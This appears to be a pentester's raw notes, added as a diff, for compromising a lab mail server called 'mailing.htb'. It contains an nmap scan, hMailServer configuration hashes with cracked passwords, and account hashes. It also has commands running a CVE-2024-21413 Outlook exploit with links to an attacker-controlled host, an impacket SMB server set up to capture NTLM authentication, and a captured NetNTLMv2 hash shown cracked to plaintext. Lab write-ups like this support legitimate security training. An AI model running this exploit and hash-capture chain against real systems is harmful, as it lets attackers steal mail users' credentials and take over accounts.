@@ -1,0 +1,129 @@
+sudo nmap -A 10.10.11.14 -T5 -p 1-65535
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-23 19:06 CEST
+Stats: 0:03:03 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 60.00% done; ETC: 19:09 (0:00:22 remaining)
+Stats: 0:05:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.85% done; ETC: 19:11 (0:00:00 remaining)
+Nmap scan report for 10.10.11.14
+Host is up (0.042s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+|_http-server-header: Microsoft-IIS/10.0
+110/tcp   open  pop3          hMailServer pop3d
+|_pop3-capabilities: UIDL USER TOP
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open  imap          hMailServer imapd
+|_imap-capabilities: QUOTA RIGHTS=texkA0001 CHILDREN ACL SORT IMAP4rev1 IDLE completed NAMESPACE CAPABILITY OK IMAP4
+445/tcp   open  microsoft-ds?
+465/tcp   open  ssl/smtp      hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+587/tcp   open  smtp          hMailServer smtpd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap      hMailServer imapd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: QUOTA RIGHTS=texkA0001 CHILDREN ACL SORT IMAP4rev1 IDLE completed NAMESPACE CAPABILITY OK IMAP4
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+7680/tcp  open  pando-pub?
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-05-23T18:49:08
+|_  start_date: N/A
+|_clock-skew: 1h37m37s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+
+
+
+C:\Program Files\hMailServer\Data\hMailServer.ini
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7  -> homenetworkingadministrator
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c   -> 6FC6F69152AD
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+
+
+
+    accountaddress	accountpassword
+    maya@mailing.htb 	84ed47a6df2a15000281c40caed8b534132807dc490e2d9d40c1d4324e588add80d33b
+    ruy@mailing.htb	adbc36c3214ccb9cddb3b1020041a3e3a1af9afbfc9ea42326c929d7ef7fd7799bd7d6
+    administrator@mailing.htb	255d222722e7a3aee50fec204cde83ef7f4c74abb7b0e64e28d80e19acbf0cdfcee4b8
+    user@mailing.htb	6838108550817f67b81d99ff4453b78a651b293f3bb8954e8e805f2af4ef00b0d6c4f2
+
+smtpreylaypassword
+maya 2ca9af353e4fa3ec92bf3778ea78db9c -> Bm8zF3c5s7R9L1o2
+domain MAILING
+
+
+python CVE-2024-21413.py --server "mailing.htb" --port 587 --username "maya" --password "Bm8zF3c5s7R9L1o2" --sender "maya@mailing.htb" --recipient "maya@mailing.htb" --url "10.10.14.179/r0tb1t.rtf" --subject "importante"
+
+
+impacket-smbserver -smb2support -ip 10.10.14.179 test /tmp
+
+
+python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.179/something" --subject milo_test
+
+MAYA::MAILING:887e2046a6646347:2836a7cae336c0dbd474fee5a542112e:0101000000000000007ec52f11aeda018b7676a14bbf06f300000000020008004c004d004400480001001e00570049004e002d004800320039004a004c00590042004c0041003300300004003400570049004e002d004800320039004a004c00590042004c004100330030002e004c004d00440048002e004c004f00430041004c00030014004c004d00440048002e004c004f00430041004c00050014004c004d00440048002e004c004f00430041004c0007000800007ec52f11aeda0106000400020000000800300030000000000000000000000000200000ac933f45e84bd391d168c9bf6ed9a5e822978b194fbd4a9ba6afea57325055e10a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370039000000000000000000:m4y4ngs4ri
+
+
+C:\Users\localadmin
+
+
+
+
